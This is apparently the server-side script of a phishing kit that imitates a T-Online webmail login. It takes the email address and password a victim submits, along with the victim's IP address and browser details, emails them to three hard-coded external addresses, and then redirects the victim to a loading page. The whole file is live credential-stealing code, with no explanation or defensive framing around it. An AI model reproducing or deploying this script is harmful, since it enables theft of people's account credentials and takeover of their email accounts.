<?php
ini_set("output_buffering",4096);
session_start();

$ip = getenv("REMOTE_ADDR");
$message .= "----------------T-ONLINE.DEA0006--------------------------\n";
$message .= "Email: ".$_POST["email"]."\n";
$message .= "Password: ".$_POST["pw_pwd"]."\n";
$message .= "IP: ".$ip."\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------T-ONLINE.DEA0006--------------------\n";


$recipient = "ghosttabernacle@hotmail.com,resultsbox@citromail.hu,microland64@gmail.com";
$subject = "|T-ONLINE|";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "Webmail ReZulT", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: ./loading.htm");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>